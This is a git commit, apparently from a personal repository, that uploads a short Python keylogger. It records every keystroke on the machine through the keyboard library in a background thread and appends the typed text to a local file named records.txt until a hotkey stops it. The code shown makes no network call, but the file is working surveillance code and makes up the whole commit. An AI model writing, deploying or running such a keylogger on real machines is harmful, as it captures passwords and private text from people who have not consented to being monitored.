0df155ee0a8ce4ba8760cfd22b0f4043ad763234
websec2313 <165148357+websec2313@users.noreply.github.com>
2024-04-15 18:31:01 +0530

    Add files via upload

---
+++ keylogger (1).py
@@ -0,0 +1,24 @@
+import keyboard as kb
+from threading import Thread
+
+SHOULD_RECORD = True
+
+def start_rec():
+    while SHOULD_RECORD:
+        rec = kb.record(until="escape")
+        seq = kb.get_typed_strings(rec)
+        with open("records.txt","a") as f:
+            f.write("".join(seq) + "\n")
+        print("One chunk saved")
+
+def stop_rec():
+    global SHOULD_RECORD
+    SHOULD_RECORD = False
+
+
+start_thread = Thread(target=start_rec)
+start_thread.start()
+
+
+kb.add_hotkey("ctrl+alt+s",stop_rec)
+kb.wait()
